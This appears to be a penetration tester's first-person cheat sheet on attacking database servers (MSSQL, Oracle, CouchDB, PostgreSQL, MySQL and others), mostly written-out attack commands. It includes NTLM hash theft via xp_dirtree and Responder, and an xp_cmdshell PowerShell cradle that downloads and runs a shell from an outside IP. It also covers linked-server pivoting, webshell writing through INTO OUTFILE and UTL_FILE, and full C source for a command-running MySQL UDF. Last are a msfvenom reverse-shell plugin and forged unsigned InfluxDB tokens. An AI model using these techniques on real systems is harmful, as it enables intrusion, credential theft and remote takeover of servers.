MSSQL
-access is granted by: DBeaver,impacket-mssqlclient (sometimes you need to use -windows-auth options or -k for kerberos authentication).py,sqsh, sqlcmd
sqlcmd -U <user> -P <password> -Q “use <db_name>; select …”
you can authenticate via password/NTLM/certificate/kerberos tickets

To list schemas

Select schema_name();

To list   databases

Select name from sysdatabases;

To list  tables 

Select table_name from <db_name>.information_schema.tables;

To list columns

Select column_name from <db_name>.information_schema.columns where table_name=’<table_name>’;

                                         Or

Select * from <db_name>.<table_schema>.<table_name>

#it must be “*”

To retrieve data
Select <column_name> from <db_name>.<schema_name>.<table_name>;



-after getting access I can steal the hash

(on vicitm)
Xp_dirtree “\\<my_ip>\simonella"

(on my terminal)
Responder –I <interface> -vv


-to get a command execution I need to enable xp_cmdshell

for impacket
Enable_xp_cmdshell
xp_cmdshell <cmd>
to escape quotation:
xp_cmdshell powershell IEX(new-Object Net.WebClient).downloadString(\”http://10.10.14.78/shell.ps1\”)

                                                      Or

for sqsh
Sqsh is better to escape single quotations

sqsh -S <victim_ip> -U <username> -P <password>
sqsh> command
sqsh>go

 execute sp_configure ‘show advanced options’,1;
execute sp_configure ‘xp_cmdshell’,1;
reconfigure;
go


-another way to get a command execution is by enabling external scripts

for both impacket and sqsh

Execute sp_configure ‘external scripts enabled’, 1;
RECONFIGURE;
go

Exec sp_execute_external_script @language=N’Python’,@script=N’print(__import__("os").system("whoami"))’;

Because this method is working in a different execution context, things that are “Access denied” for xp_cmdshell may by achievable here



-checking if there any linked servers on the current database

To check the linked servers

exec(‘Select srvname,isremote from sysservers’);

#value “0” means that the server IS linked

If linked servers do exist then:

To check as what user I can run queries on the linked server

Execute (‘select suser_name()’) at [ <server_2>];



To check if the user on the linked server  has enough privileges to enable xp_cmdshell

Execute (‘select name,sysadmin from syslogins’) at [<server_2>];

if the user on the linked server  has enough privileges to enable xp_cmdshell

Execute (‘sp_configure “show advanced options”,1;exec sp_configure “xp_cmdshell”,1;RECONFIGURE’) at [<server_2>];

Exec(‘xp_cmdshell “<command>”’) at [<server_2>];



To check linked servers on the linked server

Execute (‘select srvname,isremote from sysservers’) at [<server_2>];


If the results are positive I can execute the aforementioned commands on those servers but everything must be nested now

Execute(‘ exec(‘ ‘select suser_name() ‘ ’) at [<server_3>] ‘) at [<server_2>];



Oracle
-access is granted by dbeaver,sqlplus64 as sysdba

to install sqlplus64 download from oracle site

 oracle-instantclient-basic.x86_64.rpm
 oracle-instantclient-devel.x86_64.rpm
 oracle-instantclient-sqlplus.x86_64.rpm

then

alien –to-dev *.rpm
dpkg -i *.deb



To list databases

Select name from v$database;

To list accessible tables

Select table_name from all_tables;

To list columns

Select column_name from user_tab_cols where table_name=’<table_name>’

To retrieve data 

Select <column_name> from <table_name>



-I can read files from the underlying system:

Set serveroutput ON
Declare
  F utl_file.file_type;
  S varchar (200);
Begin
  F := utl_file.fopen(‘<dir_path>’,’<file_name>’,’R’);
Utl_file.get_line(f,s);
Utl_file.fclose(f);
Dbms_output.put_line(s);
End;
/


-I can get a code execution by  creating a malicious file in the target’s web directory  (requires: writable permissions to the target’s web directory )

Declare
  F utl_file.file_type;
  S varchar(5000) := ‘<malicous_code>’;
Begin
 F := utl_file.fopen(‘<dir_path>’,’<file_name>’,’W’);
Utl_file.put_line(f,s);
Utl_file.fclose(f);
End;
/




CouchDB
-Access is granted from the curl

To list databases

Curl <ip>:<port>/_all_dbs 

To list IDs (counter part for tables and columns)

Curl <ip>:<port>/<db_name>/_all_docs 

To retrieve data

Curl <ip>:<port>:/<db_name>/<ID>


I can get a code execution by via erlang shell
export HOME=/dev/shm
Erl  -sname simon –setcookie monster #only this name 

Erl> rpc:call(‘couchdb@<victim_IP_or_hostname>’,os,cmd,[‘<cmd>’]).


MongoDB
access granted via mongodb shell

mongosh

to list databases

show dbs

to list tables/collections

show tables

     or 
show collections

to retrieve data

db.<collection_name>.find()


to dump all data

cd /tmp
mongodump   #this will create a bunch of bson files
cat <file>.bson

InfluxDB
I need to generate JWT token with 2 parameters (remove the signature field)
username: <admin_or_other_username>
exp: <valid_epoch_time>+ add some time

access is granted via curl 

To list databases

curl -G ‘http://<victim_ip>:<port>/query?pretty=true’ –data-urlencode ‘q=show databases’ -H “Authorization: Bearer <JWT_token>”

To list tables

curl -G ‘http://<victim_ip>:<port>/query?pretty=true’ –data-urlencode “db=<db_name>” –data-urlencode “q=show measurements” -H ‘Authorization: Bearer <JWT_token>’

To get data

curl -G “http://<victim_ip>:<port>/query?pretty=true” –data-urlencode “db=<db_name>” –data-urlencode ‘q=Select * from “<table_name>”’ -H “Authorization: Bearer <JWT_token>”

KeePass
-access is granted by KeePassX

-I need <file>.kdbx and password and in order to get this password

Keepass2john <file>.kdbx  #and now I need to crack the hash


SQLite

Access is granted from the sqlite3

Sqllite3 <database_file> .dump

sqllite3 <database_file>
sqllite3>.schema  #to get databases
sqllie3> Select * from <db_name>

H2
-access is granted from the browser but in the “JDBC URL” you need to put your own name e.g simon


PostgreSQL
-access is granted from pgsql,dbeaver
-interestin files: /etc/nss-psql.conf and /etc/nss-psql-root.conf

To list databases

\list

To connect to the database

\connect <db_name>

To list tables in a database

\dt

To list columns

\d+ <table_name>

To retrieve data

Select <colum_names> from <table_name>


-I can get a code execution by creating a malicious table

Create table simon (t text);
Copy simon from program ‘<cmd>’;
Select * from simon;


MS Access databases

apt install mdbtools
mdb-sql *.mdb
>list tables
>go
>describe table <table_name>
>go
>select username,password from <table_name>
>go

MySQL

Access is granted from the terminal,dBeaver,phpMyAdmin,Admirer,msqldump

Enumeration
Interesting file: /etc/cl/my.cnf
To list databases

Show databases;

To connect to the database

Use <db_name>

To list tables in a database

Show tables;

To list columns

Describe <table_name>;

To retrieve data

Select <column_names> from <table_name>;


I can get a code execution by  

creating a malicious file in the target’s web directory  (requires: writable permissions to the target’s web directory )

Select ‘<malicious_code>’ into outfile ‘</var/www/html>/shell.php’;


UDF (user defined functions) - linux only

Abusing already existing UDF
Select * from mysql.func

If I got a function then

Select <function_name>(“<command>”);



creating own UDF to abuse them

create a malicious file with the following content
#include <stdio.h>
#include <stdlib.h>
 
enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};
 
typedef struct st_udf_args {
    unsigned int        arg_count;  // number of arguments
    enum Item_result    *arg_type;  // pointer to item_result
    char            **args;     // pointer to arguments
    unsigned long       *lengths;   // length of string args
    char            *maybe_null;    // 1 for maybe_null args
} UDF_ARGS;
 
typedef struct st_udf_init {
    char            maybe_null; // 1 if func can return NULL
    unsigned int        decimals;   // for real functions
    unsigned long       max_length; // for string functions
    char            *ptr;       // free ptr for func data
    char            const_item; // 0 if result is constant
} UDF_INIT;
 
int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
{
    if (args->arg_count != 1)
        return(0);
 
    system(args->args[0]);
 
    return(0);
}
 
char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
{
    return(0);
}



compile with the following command 
gcc -g -c malware.c
gcc -g -shared -Wl,-soname,malware.so -o malware.so malware.o -lc

transport to the victim

login into mysql
show variables like ‘%plugin%’
#this will tell us where to dump our malicious file



mysql> use <db_name>;
mysql>create table foo(line blob);
mysql>insert into foo values(load_file('/tmp/malware.so’));
mysql>select * from foo into dumpfile ‘<result_of_%plugin%>/malware.so’;
mysql>create function do_system returns integer soname '
malware.so’;
mysql>select * from mysql.func;

#If everything went well you just created user defined function so
mysql> select <function_name>(“<command>”);



malicious plugins (linux only)

msfvenom -p linux/x64/shell_reverse_tcp lhost=<attacker_ip> lport=5555 -f elf-so > shell.so

login into mysql
set global wsrep_provider=”/tmp/shell.so”;

#if vulnerable I will automatically get a shell

I can read files from the underlying system

Select load_file(‘/etc/passwd’);


